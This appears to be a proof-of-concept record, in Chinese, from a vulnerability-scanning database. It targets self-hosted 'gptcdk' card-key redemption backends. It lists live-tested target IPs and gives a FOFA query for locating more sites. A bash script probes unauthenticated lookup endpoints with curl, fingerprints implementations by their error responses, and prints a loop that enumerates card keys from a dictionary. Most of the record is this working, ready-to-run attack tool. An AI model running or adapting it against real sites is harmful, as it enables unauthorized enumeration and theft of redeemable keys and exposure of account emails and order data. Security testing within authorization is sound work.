# gptcdk 卡密兑换站群自托管后端未授权卡密查询/枚举探测

- **code**: gptcdk-卡密兑换站群自托管后端未授权卡密查询-枚举探测
- **kind**: poc
- **category**: unauthorized
- **component**: gptcdk 卡密兑换中心（自托管卡密后端）
- **severity**: high
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 20xx-09-28 在靶标「tgt9215app集群」的三个同源码站上实测通过：203.0.113.106（GET /api/v1/public/cdk/result-by-code 与 /api/v1/lookup/cdk → 200 {"code":404,"msg":"没有查到这张卡的兑换记录"}，无鉴权、无格式校验）；203.0.113.105/example.com（POST /api/v1/cdk/lookup → 200/262B 完整卡密对象，含 can_redeem/plan/order 字段）；203.0.113.98/example.com（FastAPI，POST /api/v1/cdk/lookup 与 /api/v1/cdk/redeem-account 经 422 泄露字段 code+account_email，无鉴权）。均无需任何 Cookie/Token。
- **path**: pocs/gptcdk-卡密兑换站群自托管后端未授权卡密查询-枚举探测/probe_gptcdk_backend.sh
- **tags**: 卡密兑换中心,gptcdk,未授权访问,枚举,fastapi,c ChatGPT卡台
- **created_at**: 2026-09-28T06:36:08.636Z
- **found_by**: vuln-scan

## 描述

探测 gptcdk 卡密站群自托管后端的未授权卡密查询/枚举接口。原理：同模板站群各自部署后端且普遍不做鉴权，接口会直接按 code 查库并返回业务语义（而非 401/403），据此可在线枚举卡密；命中后返回卡密状态、套餐、订单与可兑换状态。前提：目标站 app.js 含 DEFAULT_API_BASE 常量。

## 用法

```
bash probe_gptcdk_backend.sh https://203.0.113.106 TEST1234
替换 TARGET 为同源码卡密站地址（先用 FOFA body="卡密兑换中心" 或 app.js 里的 DEFAULT_API_BASE 定位），CODE 为待测卡密。
枚举模式见脚本 [6] 段（codes.txt 为卡密字典，须在授权范围内使用）。
```

## 正文

```
#!/usr/bin/env bash
# 卡密兑换中心自托管后端 —— 未授权卡密查询/枚举探测
# 适用：gptcdk 同源码卡密站群（app.js 内含 DEFAULT_API_BASE 常量、「★★★ 配置区」注释）
# 该模板站群各自部署自托管后端，接口普遍无鉴权
set -u
TARGET="${1:-https://203.0.113.106}"
CODE="${2:-TEST1234}"
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36'

echo "[1] GET result-by-code（部分实现无格式校验，直接查库）"
curl -s -i --max-time 12 -A "$UA" "$TARGET/api/v1/public/cdk/result-by-code?code=$CODE" | head -12
echo
echo "[2] GET lookup/cdk（另一实现）"
curl -s -i --max-time 12 -A "$UA" "$TARGET/api/v1/lookup/cdk?code=$CODE" | head -12
echo
echo "[3] POST cdk/lookup（返回完整卡密对象：status/plan/plan_key/can_redeem/order）"
curl -s -i --max-time 12 -A "$UA" -X POST "$TARGET/api/v1/cdk/lookup" \
  -H 'Content-Type: application/json' -d "{\"code\":\"$CODE\"}" | head -14
echo
echo "[4] POST cdk/redeem-account（FastAPI 实现，字段经 422 泄露：code + account_email）"
curl -s -i --max-time 12 -A "$UA" -X POST "$TARGET/api/v1/cdk/redeem-account" \
  -H 'Content-Type: application/json' -d '{}' | head -10
echo
echo "[5] 路由判定要点"
echo "  · 405 + {\"detail\":\"Method Not Allowed\"}  → FastAPI 实现（203.0.113.98）"
echo "  · 405 + allow: POST                        → FastAPI 路由确认"
echo "  · {\"ok\":false,\"error\":{\"code\":\"method_not_allowed\"}} → 自研 REST（203.0.113.105）"
echo "  · {\"code\":404,\"msg\":\"not found\"}(33B) vs 业务消息(60B) → 用于区分真实路由与兜底 404"
echo
echo "[6] 枚举（谨慎：会产生撞库流量，仅限授权测试）"
echo "  for c in \$(cat codes.txt); do"
echo "    curl -s \"$TARGET/api/v1/public/cdk/result-by-code?code=\$c\" | grep -v '没有查到' && echo \"HIT \$c\";"
echo "    sleep 1; done"
```
